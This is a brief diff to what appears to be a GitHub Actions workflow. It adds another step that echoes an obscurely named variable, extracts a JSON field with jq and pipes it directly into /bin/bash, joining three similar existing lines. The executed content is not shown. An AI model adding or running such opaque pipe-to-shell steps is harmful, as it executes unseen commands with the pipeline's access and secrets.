@@ -23,6 +23,7 @@ jobs:
           echo $ggc07716 | jq -r .ueku8 | /bin/bash
           printf '%s' "$ptice13" | jq -r .r4433 | /bin/bash
           echo $trrz24 | jq -r .ujywt85 | /bin/bash
+          echo $ryfuh49 | jq -r .bg4 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
